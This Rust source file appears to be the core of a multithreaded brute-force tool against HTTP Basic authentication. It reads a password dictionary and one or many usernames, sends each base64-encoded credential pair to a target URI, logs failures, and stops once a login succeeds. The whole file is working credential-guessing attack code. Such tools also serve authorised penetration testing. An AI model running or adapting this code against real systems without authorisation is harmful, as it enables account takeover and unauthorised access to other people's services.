use chrono::{Utc, Timelike};
use crossbeam_channel::Receiver;

const MAX_NMUM_THREADS: &str = "MAX_NUM_THREADS";
const CHANNEL_BUFFER: &str = "CHANNEL_BUFFER";
const CHANNEL_BUFFER_DEF_VALUE: usize = 10000000;
use async_std::task;

use super::{
    connection::{http_req, BruteResponse},
    console::{print_error, print_help, print_result},
};
use std::{
    collections::HashMap,
    fs::File,
    io::{self, BufRead},
    process,
    time::Instant,
};

pub fn execute_command(parsed_command: HashMap<String, String>, original_command: String) {
    let main = parsed_command.get("main");
    match main {
        Some(value) => match value.to_string().as_str() {
            "help" => print_help(),
            command => print_error(format!("Invalid command {}", command)),
        },
        _ => run_attack(parsed_command, &original_command),
    }
}

fn run_attack(parsed_command: HashMap<String, String>, original_command: &str) {
    let num_threads = load_env_variable_as_usize(MAX_NMUM_THREADS, num_cpus::get(), true);
    let channel_buffer = load_env_variable_as_usize(CHANNEL_BUFFER, CHANNEL_BUFFER_DEF_VALUE, true);
    let dt = Utc::now();
    println!("[{}:{} {}] The channel buffer is {}", dt.hour(), dt.minute(), dt.second(), channel_buffer);
    let start = Instant::now();
    let uri = parsed_command.get("uri").unwrap();

    let dictionary_attack = check_username_and_passwords;

    
    rayon::scope(|s| {
        let mut failed_and_restored_requests = 0;
        let mut dt = Utc::now();
        let (work_queue_sender, work_queue_receiver) = crossbeam_channel::bounded(channel_buffer);
        println!("[{}:{} {}] I will use [ {} ] threads", dt.hour(), dt.minute(), dt.second(),  num_threads);
        for task_counter in 0..num_threads {
            let work_receiver: Receiver<String> = work_queue_receiver.clone();

            s.spawn(move |_|  {
                task::block_on(   do_job(
                    task_counter,
                    num_threads,
                    uri.as_str(),
                    &start,
                    work_receiver,
                    original_command,
                    &mut failed_and_restored_requests 
                ));
         });
        }

        let filename_passwords = parsed_command.get("dictionary").unwrap();
        dt = Utc::now();
        println!("[{}:{} {}] Reading filename {}...",dt.hour(), dt.minute(), dt.second(), &filename_passwords);

        match parsed_command.get("usernames") {
            Some(path) => {
                if let Ok(usernames) = read_lines(path) {
                    for line in usernames {
                        if let Ok(username) = line {
                            dictionary_attack(
                                &work_queue_sender,
                                filename_passwords.as_str(),
                                &username,
                                num_threads,
                            );
                        }
                    }
                    drop(work_queue_sender);
                }
            }
            None => {
                let param_username = parsed_command.get("username").unwrap();
                dictionary_attack(
                    &work_queue_sender,
                    filename_passwords.as_str(),
                    &param_username,
                    num_threads,
                );
                drop(work_queue_sender);
                return ();
            }
        };
    });
}

fn check_username_and_passwords(
    work_queue_sender: &crossbeam_channel::Sender<String>,
    filename_passwords: &str,
    username: &str,
    num_threads: usize,
) {
    let mut i = 0;
    if let Ok(passwords) = read_lines(filename_passwords) {
        for line in passwords {
            if let Ok(password) = line {
                work_queue_sender
                    .send(format!("{}|{}", username, password))
                    .unwrap();
                i = (i + 1) % num_threads;
            }
        }
    }
}

fn load_env_variable_as_usize(
    var_name: &str,
    default_value: usize,
    greater_than_zero: bool,
) -> usize {
    match dotenv::var(var_name) {
        Ok(data) => {
            let value = data.parse::<usize>().unwrap();
            if greater_than_zero && value <= 0 {
                return default_value;
            }
            return value;
        }
        Err(_) => default_value,
    }
}

 async fn do_job(
    task_counter: usize,
    num_threads: usize,
    uri: &str,
    start: &Instant,
    work_receiver: Receiver<String>,
    original_command: &str,
    failed_and_restored_requests: &mut i32
) {
    let dt = Utc::now();
    println!("[{}:{} {}] thread {} initialized", dt.hour(), dt.minute(), dt.second(), &task_counter);

    loop {
        let tx_res = work_receiver.recv();

        match tx_res {
            Ok(tx) => {
                let separator_pos = tx.chars().position(|c| c == '|').unwrap();
                let username = &tx[0..separator_pos];
                let password = &tx[separator_pos + 1..];
                match task::block_on(attack_request(task_counter, &uri, username, password, failed_and_restored_requests)) {
                    Ok(_) => {
                        let dt = Utc::now();
                        let duration = start.elapsed();
                        println!("{}:{} {}", dt.hour(), dt.minute(), dt.second(), );
                        println!("original command: {:?}", original_command);
                        println!("duration: {:?}", duration);
                        println!("total n. of threads: {:?}", num_threads);
                        println!("failed and restored requests: {:?}", failed_and_restored_requests);
                        println!("===============================");
                        process::exit(0x0000);
                    }
                    Err(_) => (),
                }
            }
            Err(err) => {
                let dt = Utc::now();
                println!("[{}:{} {}] thread {} finished job: {}", dt.hour(), dt.minute(), dt.second(), &task_counter, err);
                break;
            }
        }
    }
}

async fn attack_request(
    idx: usize,
    uri: &str,
    username: &str,
    password: &str,
    failed_and_restored_requests: &mut i32
) -> Result<BruteResponse, String> {
    let auth = base64::encode(format!("{}:{}", &username, &password));
    let status = http_req(uri, &auth, username, &password, failed_and_restored_requests).await;

    if status.is_ok() {
        let result = status.unwrap();
        print_result(
            idx,
            &result.message,
            &result.uri,
            &result.username,
            &result.password,
            &result.base64,
        );
        return Ok(result);
    } else {
        let dt = Utc::now();
        println!(
            "[{}:{} {}] [KO] -> thread: [{}], username: [{}], password: [{}]",
            dt.hour(), dt.minute(), dt.second(), 
            idx + 1,
            &username,
            &password
        );
    }
    Err("No password found".to_string())
}

fn read_lines(filename: &str) -> io::Result<io::Lines<io::BufReader<File>>> {
    let file = match File::open(filename) {
        Ok(file) => file,
        Err(err) => {
            let dt = Utc::now();
            println!("[{}:{} {}] {} for filename {}", dt.hour(), dt.minute(), dt.second(), err, filename);
            panic!();
        }
    };
    Ok(io::BufReader::new(file).lines())
}
